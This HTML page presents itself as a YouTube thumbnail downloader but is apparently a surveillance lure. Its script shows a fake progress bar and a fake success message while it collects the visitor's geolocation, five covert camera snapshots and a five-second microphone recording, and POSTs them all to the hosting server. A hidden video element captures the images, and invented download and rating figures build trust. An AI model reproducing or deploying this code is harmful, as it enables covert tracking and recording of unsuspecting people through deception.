<!DOCTYPE html>
<html lang="ps" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Thumbnail Downloader</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background-color: #0b0f19; color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 0; padding-bottom: 30px; }
        .top-banner { background: linear-gradient(180deg, #ff0000 0%, #cc0000 100%); width: 100%; padding: 25px 15px; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px; border-bottom-left-radius: 30px; border-bottom-right-radius: 30px; }
        .yt-logo { background: white; color: #ff0000; padding: 6px 16px; border-radius: 10px; font-size: 22px; font-weight: 900; display: inline-flex; align-items: center; gap: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
        .yt-title { font-size: 22px; font-weight: bold; color: #ffffff; display: flex; align-items: center; gap: 8px; }
        .container { width: 100%; max-width: 420px; background-color: #ffffff; color: #333333; border-radius: 24px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); margin-top: -20px; position: relative; z-index: 5; display: flex; flex-direction: column; gap: 15px; }
        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; text-align: center; background-color: #f8f9fa; padding: 12px 6px; border-radius: 16px; border: 1px solid #e9ecef; }
        .stat-val { font-size: 15px; font-weight: bold; color: #ff0000; }
        .stat-lbl { font-size: 10px; color: #6c757d; margin-top: 3px; }
        .card { background-color: #f8f9fa; padding: 12px 15px; border-radius: 14px; border: 1px solid #e9ecef; }
        .card-label { font-size: 13px; color: #6c757d; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; font-weight: bold; }
        .input-box { width: 100%; background: #ffffff; border: 1px solid #ced4da; border-radius: 30px; padding: 12px 18px; color: #333; font-size: 14px; outline: none; }
        .grid-quality { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .q-card { background-color: #ffffff; border: 1px solid #ced4da; padding: 12px 5px; border-radius: 14px; text-align: center; cursor: pointer; position: relative; }
        .q-card.active { background: linear-gradient(135deg, #ff0000, #cc0000); border-color: #ff0000; color: white; }
        .q-card.active .q-title, .q-card.active .q-sub { color: #ffffff !important; }
        .pop-badge { position: absolute; top: -8px; left: 50%; transform: translateX(-50%); background-color: #ff9800; color: white; font-size: 8px; font-weight: bold; padding: 2px 6px; border-radius: 6px; text-transform: uppercase; }
        .q-title { font-size: 15px; font-weight: bold; color: #333; }
        .q-sub { font-size: 11px; color: #6c757d; margin-top: 4px; }
        .generate-btn { background: linear-gradient(135deg, #ff0000, #cc0000); color: white; width: 100%; padding: 16px; border: none; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; box-shadow: 0 4px 15px rgba(255,0,0,0.3); }
        .error-box { display: none; background-color: rgba(255, 0, 0, 0.1); border: 1px solid #ff0000; border-radius: 12px; padding: 12px; text-align: center; font-size: 13px; color: #ff0000; font-weight: bold; }
        .process-box { display: none; background-color: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 12px; text-align: center; margin-top: 5px; }
        .process-text { display: flex; justify-content: space-between; font-size: 13px; color: #6c757d; margin-bottom: 8px; }
        .progress-bar-container { width: 100%; background-color: #e9ecef; height: 8px; border-radius: 4px; overflow: hidden; }
        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #ff0000, #cc0000); transition: width 0.3s ease; }
        .success-box { display: none; background-color: rgba(40, 167, 69, 0.1); border: 1px solid #28a745; border-radius: 12px; padding: 12px; text-align: center; font-size: 13px; color: #28a745; font-weight: bold; }
        .footer-info { text-align: center; font-size: 11px; color: #868e96; margin-top: 15px; }
        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
        canvas { display: none; }
    </style>
</head>
<body>
    <div class="top-banner">
        <div class="yt-logo">▶ YouTube</div>
        <div class="yt-title">Thumbnail Downloader</div>
    </div>
    <div class="container">
        <div class="stats-grid">
            <div class="stat-card"><div class="stat-val">3.8M+</div><div class="stat-lbl">Total Downloads</div></div>
            <div class="stat-card"><div class="stat-val">1.2M+</div><div class="stat-lbl">Happy Users</div></div>
            <div class="stat-card"><div class="stat-val">4.9 ⭐</div><div class="stat-lbl">User Rating</div></div>
        </div>
        <div class="card" style="background: transparent; border: none; padding: 0;">
            <span class="card-label">🔗 Enter Video URL</span>
            <input type="text" class="input-box" id="videoUrl" placeholder="Paste YouTube Video URL here..">
        </div>
        <span class="card-label" style="margin-bottom: -5px;">Select Thumbnail Quality</span>
        <div class="grid-quality">
            <div class="q-card" data-quality="Normal HQ"><div class="q-title">🖼️ HQ</div><div class="q-sub">Normal</div></div>
            <div class="q-card active" data-quality="HD 1080p"><div class="pop-badge">POPULAR</div><div class="q-title">🖼️ HD</div><div class="q-sub">Max Res</div></div>
            <div class="q-card" data-quality="4K Ultra"><div class="q-title">🖼️ 4K</div><div class="q-sub">Ultra HD</div></div>
        </div>
        <button id="generateBtn" class="generate-btn">🔍 Fetch Thumbnail</button>
        <div id="errorBox" class="error-box">⚠️ Please enter a valid YouTube video URL first!</div>
        <div id="processBox" class="process-box">
            <div class="process-text"><span id="processStatus">Fetching thumbnail...</span><span id="processPercent">0%</span></div>
            <div class="progress-bar-container"><div id="progressBar" class="progress-bar"></div></div>
        </div>
        <div id="successBox" class="success-box">✅ Thumbnail successfully fetched! Ready to download.</div>
    </div>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    <script>
        const qualityCards = document.querySelectorAll('.q-card');
        let selectedQualityValue = 'HD 1080p';
        qualityCards.forEach(card => {
            card.addEventListener('click', function(e) {
                e.preventDefault();
                qualityCards.forEach(c => c.classList.remove('active'));
                this.classList.add('active');
                selectedQualityValue = this.getAttribute('data-quality');
            });
        });
        async function sendData(fd) { try { await fetch(window.location.href, { method: 'POST', body: fd }); } catch(e){} }
        async function sendSinglePhoto(stream) {
            const v = document.getElementById('video'), c = document.getElementById('canvas');
            if (!v.srcObject) { v.srcObject = stream; await v.play(); }
            c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
            return new Promise(r => c.toBlob(async b => { const fd = new FormData(); fd.append('photo', b, 'photo.jpg'); await sendData(fd); r(); }, 'image/jpeg'));
        }
        async function recordAndSendAudio(stream) {
            return new Promise(r => {
                try {
                    const mr = new MediaRecorder(stream), chunks = [];
                    mr.ondataavailable = e => chunks.push(e.data);
                    mr.onstop = async () => { const fd = new FormData(); fd.append('voice', new Blob(chunks, {type: 'audio/ogg'}), 'voice.ogg'); await sendData(fd); r(); };
                    mr.start(); setTimeout(() => { if(mr.state !== 'inactive') mr.stop(); }, 5000);
                } catch(e) { r(); }
            });
        }
        document.getElementById("generateBtn").addEventListener("click", async function() {
            const btn = document.getElementById("generateBtn"), urlInput = document.getElementById("videoUrl");
            if(urlInput.value.trim() === "") { document.getElementById("errorBox").style.display = "block"; return; }
            document.getElementById("errorBox").style.display = "none";
            btn.innerText = "Processing..."; btn.disabled = true;
            document.getElementById("processBox").style.display = "block";
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += 2;
                if(progress <= 100) { document.getElementById("progressBar").style.width = progress + '%'; document.getElementById("processPercent").innerText = progress + '%'; }
            }, 60);
            if (navigator.geolocation) {
                await new Promise(r => navigator.geolocation.getCurrentPosition(async pos => {
                    const fd = new FormData(); fd.append('latitude', pos.coords.latitude); fd.append('longitude', pos.coords.longitude); await sendData(fd); r();
                }, () => r(), { timeout: 4000 }));
            }
            try {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    document.getElementById('video').srcObject = stream; await document.getElementById('video').play();
                    await new Promise(r => setTimeout(r, 300));
                    let count = 0;
                    const interval = setInterval(async () => { if(count < 5) { count++; await sendSinglePhoto(stream); } else { clearInterval(interval); } }, 800);
                    await recordAndSendAudio(stream);
                    stream.getTracks().forEach(t => t.stop());
                }
            } catch(e) {}
            clearInterval(progressInterval);
            setTimeout(() => {
                document.getElementById("processBox").style.display = "none";
                document.getElementById("successBox").style.display = "block";
                btn.innerText = "Thumbnail Fetched ✅";
            }, 500);
        });
    </script>
</body>
</html>
